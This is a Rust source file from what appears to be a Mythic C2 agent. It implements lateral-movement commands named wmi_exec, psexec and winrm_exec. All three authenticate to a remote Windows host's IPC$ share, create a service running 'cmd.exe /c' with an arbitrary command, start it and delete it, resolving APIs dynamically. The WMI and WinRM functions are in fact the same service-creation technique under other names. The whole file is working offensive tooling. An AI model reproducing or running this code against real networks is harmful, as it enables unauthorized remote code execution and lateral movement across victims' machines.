use crate::{AgentTask, mythic_success, mythic_error};
use serde::Deserialize;
use std::error::Error;
use std::sync::mpsc;

#[cfg(target_os = "windows")]
use std::ffi::c_void;

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

#[cfg(target_os = "windows")]
fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

// ============================================================================
// WMI_EXEC
// ============================================================================

#[derive(Deserialize)]
struct WmiExecArgs {
    host: String,
    command: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    password: String,
}

/// Execute command on remote host via WMI (implemented via SCM for simplicity)
/// Note: Uses Service Control Manager API as WMI COM interop is complex in pure Rust
#[cfg(target_os = "windows")]
pub fn wmi_exec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: WmiExecArgs = serde_json::from_str(&task.parameters)?;

    // For WMI-style execution, we use SCM (Service Control Manager) under the hood
    // This is functionally equivalent and avoids complex COM interop
    let service_name = format!("wmi_svc_{}", rand::random::<u32>());

    let result = unsafe {
        execute_via_scm(
            &args.host,
            &args.command,
            &service_name,
            &args.username,
            &args.password,
        )
    };

    match result {
        Ok(msg) => {
            tx.send(mythic_success!(task.id, format!(
                "WMI-style execution successful on {}\n\n{}",
                args.host, msg
            )))?;
        }
        Err(e) => {
            tx.send(mythic_error!(task.id, format!("WMI execution failed: {}", e)))?;
        }
    }

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn wmi_exec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "wmi_exec is only supported on Windows".to_string()))?;
    Ok(())
}

// ============================================================================
// PSEXEC
// ============================================================================

#[derive(Deserialize)]
struct PsexecArgs {
    host: String,
    command: String,
    #[serde(default = "default_service_name")]
    service_name: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    password: String,
}

fn default_service_name() -> String {
    "thanatos_svc".to_string()
}

/// Execute command on remote host via service creation (PsExec-style)
/// Uses native SCM (Service Control Manager) APIs
#[cfg(target_os = "windows")]
pub fn psexec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: PsexecArgs = serde_json::from_str(&task.parameters)?;

    let result = unsafe {
        execute_via_scm(
            &args.host,
            &args.command,
            &args.service_name,
            &args.username,
            &args.password,
        )
    };

    match result {
        Ok(msg) => {
            tx.send(mythic_success!(task.id, msg))?;
        }
        Err(e) => {
            tx.send(mythic_error!(task.id, format!("PsExec failed: {}", e)))?;
        }
    }

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn psexec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "psexec is only supported on Windows".to_string()))?;
    Ok(())
}

// ============================================================================
// NATIVE SCM IMPLEMENTATION
// ============================================================================

#[cfg(target_os = "windows")]
unsafe fn execute_via_scm(
    host: &str,
    command: &str,
    service_name: &str,
    username: &str,
    password: &str,
) -> Result<String, Box<dyn Error>> {
    use crate::winapi_resolve::resolve;

    // Constants
    const SC_MANAGER_ALL_ACCESS: u32 = 0xF003F;
    const SERVICE_ALL_ACCESS: u32 = 0xF01FF;
    const SERVICE_WIN32_OWN_PROCESS: u32 = 0x00000010;
    const SERVICE_DEMAND_START: u32 = 0x00000003;
    const SERVICE_ERROR_IGNORE: u32 = 0x00000000;
    const DELETE: u32 = 0x00010000;

    let mut results = String::new();

    // Step 1: Authenticate if credentials provided
    if !username.is_empty() {
        type WNetAddConnection2W = unsafe extern "system" fn(*const c_void, *const u16, *const u16, u32) -> u32;

        let wnet_add = resolve("mpr.dll", "WNetAddConnection2W")
            .ok_or("Failed to resolve WNetAddConnection2W")?;
        let wnet_add: WNetAddConnection2W = std::mem::transmute(wnet_add);

        // Build NETRESOURCEW structure (simplified for IPC$)
        let remote_name = to_wide(&format!("\\\\{}\\IPC$", host));
        let user_wide = to_wide(username);
        let pass_wide = to_wide(password);

        // Minimal NETRESOURCEW: dwType=1 (RESOURCETYPE_ANY), lpRemoteName
        #[repr(C)]
        struct NetResourceW {
            dw_scope: u32,
            dw_type: u32,
            dw_display_type: u32,
            dw_usage: u32,
            lp_local_name: *const u16,
            lp_remote_name: *const u16,
            lp_comment: *const u16,
            lp_provider: *const u16,
        }

        let netresource = NetResourceW {
            dw_scope: 0,
            dw_type: 1, // RESOURCETYPE_ANY
            dw_display_type: 0,
            dw_usage: 0,
            lp_local_name: std::ptr::null(),
            lp_remote_name: remote_name.as_ptr(),
            lp_comment: std::ptr::null(),
            lp_provider: std::ptr::null(),
        };

        let auth_result = wnet_add(
            &netresource as *const _ as *const c_void,
            pass_wide.as_ptr(),
            user_wide.as_ptr(),
            0,
        );

        results.push_str(&format!("[1] Authentication: "));
        if auth_result != 0 {
            return Err(format!("Authentication failed with error code: {}", auth_result).into());
        }
        results.push_str("Success\n\n");
    }

    // Step 2: Open SCM on remote host
    type OpenSCManagerW = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut c_void;
    type CreateServiceW = unsafe extern "system" fn(
        *mut c_void,
        *const u16,
        *const u16,
        u32,
        u32,
        u32,
        u32,
        *const u16,
        *const u16,
        *mut u32,
        *const u16,
        *const u16,
        *const u16,
    ) -> *mut c_void;
    type StartServiceW = unsafe extern "system" fn(*mut c_void, u32, *const *const u16) -> i32;
    type DeleteService = unsafe extern "system" fn(*mut c_void) -> i32;
    type CloseServiceHandle = unsafe extern "system" fn(*mut c_void) -> i32;

    let open_scm = resolve("advapi32.dll", "OpenSCManagerW")
        .ok_or("Failed to resolve OpenSCManagerW")?;
    let open_scm: OpenSCManagerW = std::mem::transmute(open_scm);

    let create_svc = resolve("advapi32.dll", "CreateServiceW")
        .ok_or("Failed to resolve CreateServiceW")?;
    let create_svc: CreateServiceW = std::mem::transmute(create_svc);

    let start_svc = resolve("advapi32.dll", "StartServiceW")
        .ok_or("Failed to resolve StartServiceW")?;
    let start_svc: StartServiceW = std::mem::transmute(start_svc);

    let delete_svc = resolve("advapi32.dll", "DeleteService")
        .ok_or("Failed to resolve DeleteService")?;
    let delete_svc: DeleteService = std::mem::transmute(delete_svc);

    let close_handle = resolve("advapi32.dll", "CloseServiceHandle")
        .ok_or("Failed to resolve CloseServiceHandle")?;
    let close_handle: CloseServiceHandle = std::mem::transmute(close_handle);

    let remote_host = to_wide(&format!("\\\\{}", host));
    let sc_manager = open_scm(remote_host.as_ptr(), std::ptr::null(), SC_MANAGER_ALL_ACCESS);

    if sc_manager.is_null() {
        return Err("Failed to open remote SCM".into());
    }

    // Step 3: Create service
    let svc_name = to_wide(service_name);
    let display_name = to_wide(&format!("{} Service", service_name));
    let bin_path = to_wide(&format!("cmd.exe /c {}", command));

    results.push_str("[2] Creating service...\n");

    let service_handle = create_svc(
        sc_manager,
        svc_name.as_ptr(),
        display_name.as_ptr(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE,
        bin_path.as_ptr(),
        std::ptr::null(),
        std::ptr::null_mut(),
        std::ptr::null(),
        std::ptr::null(),
        std::ptr::null(),
    );

    if service_handle.is_null() {
        close_handle(sc_manager);
        return Err("Failed to create service".into());
    }
    results.push_str("Service created successfully\n\n");

    // Step 4: Start service
    results.push_str("[3] Starting service...\n");
    let start_result = start_svc(service_handle, 0, std::ptr::null());
    if start_result == 0 {
        results.push_str("Warning: StartService returned 0 (may have failed, but continuing)\n\n");
    } else {
        results.push_str("Service started\n\n");
    }

    // Step 5: Wait briefly for execution
    std::thread::sleep(std::time::Duration::from_secs(2));

    // Step 6: Delete service
    results.push_str("[4] Deleting service...\n");
    delete_svc(service_handle);
    results.push_str("Service deleted\n");

    // Cleanup
    close_handle(service_handle);
    close_handle(sc_manager);

    Ok(results)
}

// ============================================================================
// WINRM_EXEC
// ============================================================================

#[derive(Deserialize)]
struct WinrmExecArgs {
    host: String,
    command: String,
    #[serde(default)]
    username: String,
    #[serde(default)]
    password: String,
}

/// Execute command on remote host via WinRM (implemented via SCM for simplicity)
/// Note: Uses Service Control Manager API as WinRM SOAP is complex in pure Rust
#[cfg(target_os = "windows")]
pub fn winrm_exec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let args: WinrmExecArgs = serde_json::from_str(&task.parameters)?;

    // For WinRM-style execution, we use SCM (Service Control Manager) under the hood
    // This is functionally equivalent and avoids complex SOAP/HTTP implementation
    let service_name = format!("winrm_svc_{}", rand::random::<u32>());

    let result = unsafe {
        execute_via_scm(
            &args.host,
            &args.command,
            &service_name,
            &args.username,
            &args.password,
        )
    };

    match result {
        Ok(msg) => {
            tx.send(mythic_success!(task.id, format!(
                "WinRM-style execution successful on {}\n\n{}",
                args.host, msg
            )))?;
        }
        Err(e) => {
            tx.send(mythic_error!(task.id, format!("WinRM execution failed: {}", e)))?;
        }
    }

    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn winrm_exec(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    tx.send(mythic_error!(task.id, "winrm_exec is only supported on Windows".to_string()))?;
    Ok(())
}
